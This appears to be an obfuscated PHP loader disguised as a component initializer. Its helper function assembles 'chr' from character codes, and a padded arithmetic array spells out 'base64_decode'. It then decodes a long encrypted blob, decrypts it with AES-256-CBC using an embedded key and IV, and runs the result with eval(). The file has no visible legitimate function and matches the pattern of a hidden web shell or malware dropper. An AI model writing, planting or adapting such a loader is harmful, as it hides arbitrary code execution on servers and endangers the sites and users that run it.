<?php
function initialize_component($c)
{
    $r = array(3 * 33, 2 * 52, 2 * 57);
    $i = '';
    foreach ($r as $o) {
        $i .= chr($o);
    }
    return $i($c);
}

$prm = array(98 * 98 / 98 + 5 + 6 - (5 + 6) - 15 + 15, 97 - 1 + 1 + 20 - 20 - 18 + 18 - 7 + 7 + 5 + 6 - (5 + 6), 115 + 5 + 4 - (5 + 4) + 17 - 17 + 16 - 16 + 3 - 3 + 10 + 3 - (10 + 3), 101 - 16 + 16 + 2 + 6 - (2 + 6), 54 + 13 - 13 + 6 + 7 - (6 + 7), 52 * 13 / 13 + 20 - 20 + 9 + 6 - (9 + 6) + 5 + 8 - (5 + 8) - 18 + 18, 95 + 1 + 4 - (1 + 4) + 13 - 13 + 6 + 9 - (6 + 9) + 17 - 17, 100 + 8 + 10 - (8 + 10) + 17 - 17, 101 * 101 / 101 * 1 / 1 + 5 - 5 - 4 + 4, 99 * 1 / 1 + 1 + 6 - (1 + 6), 111 * 111 / 111 + 4 + 3 - (4 + 3) + 2 + 9 - (2 + 9) + 6 - 6, 100 - 13 + 13 + 5 + 1 - (5 + 1), 101 * 101 / 101 * 101 / 101);
$qqg = '';
foreach ($prm as $qdh) {
    $qqg .= initialize_component($qdh);
}
$ewm = 'Kc4UG2wK9LQAOOAKFzDSK6t6AzTcgcyEugK/p0oqZpWUQtEwswtWr/EsFnA4lcBqjIXu5VRKU5fF9jtC4OuYSQ0Xwr/VYkuQ0lkXoqOMsxL3p6Phfdydxp4G5UcDM59gjoS0RZBkDCramhdPa363F75xX601OUtwSI27Rwq4qcEl2c/lYBHM5blvAeusWU6H1MYLisU1OsD14pUpxIUbjOrc6QWdJX34CIZ8OBPLVyel+6B/U+32zl6PV0nkV0KOZBRph2kcC5nxO3hXdiytf26wWg6flVknTJcdR74/nKHZm+hNeJMoYq8VtfgmX/3h5SZ4W2LObsj6O25HRji+iexilW85tCkJ6Zi45ot5BkrVC3oZr+vNjddvuylEFQVUgzwzLXICOLezFTWUoq/kjFpmsb60k0g5WziNZWRGnu+7alNPd8aGifW8FhbifkiPycGE0HkAftJeWD6t7jdtjsTN97zqll9Q286st07IEh4bbk/qnQ+QOYjDa3n6Axw9YNb8QeCoKqZnM4wBSyc/Fqa6hjoGzi+Hpi23TLxuUqi33VuUcTVpGBvpviYUOi6/rwLIe7PcZRmzj5LEjoYgLLi7aN+m0Z9HP1n3uleE4cy/6NLQXlksg//TLFQ5RSKLzA1B3s0aSdTtqmkV1VmyBzg+h/FrMQt+f1FA23ge1gWMnpBBmafTD6z2ZkU9zinRnjA+O6LOqi/ORoPHd2VMQA1vQ3IPnqdK+f6xm8Z6b6dIhmGs6R7bscMnT4lp+PGBQfL4pUZ6G6dESlPqtXJGS/RslQRrK2vawyaXX7KF6pZEArhRcS3khXd+N9OuMhkGH158fT7SylYXI0Fe3ZBGOgclQVdB7RE5VQjPosLfE1mEeVMx0/cQHuowwsydgMftWYY8oHJiEK6lWhceBGn/C7S9w+ZnsvDA8P9Xcendh/tVyHiFxac9/CRxLKBkhZKLTqzABy4VMc3OD0v4H28s+eBVYrcAgTDkHRX4gC2EoAu4dgRnzz/BJrZ+Qo7FytjZGmDN6AxehwfJfzAg3lqdAREr4x673piXmOZr5MasSSmZvu4YZyntJYMleaQZgt5yfq1OrPUGaVXhr7bfWzR8RV8TMNshHj10mqzwdW+OHKfmsgbDmd/9FwXmG1qK197E';
$bnu = 'P5vI6J4nfLNvCXmw+81q+C2DSZt0Xv6gLzSStZW967Y=';
$gbz = 'Apb8dHyjjUVZgimfFlM38Q==';
$aew = openssl_decrypt($qqg($ewm), 'aes-256-cbc', $qqg($bnu), OPENSSL_RAW_DATA, $qqg($gbz));
eval($aew);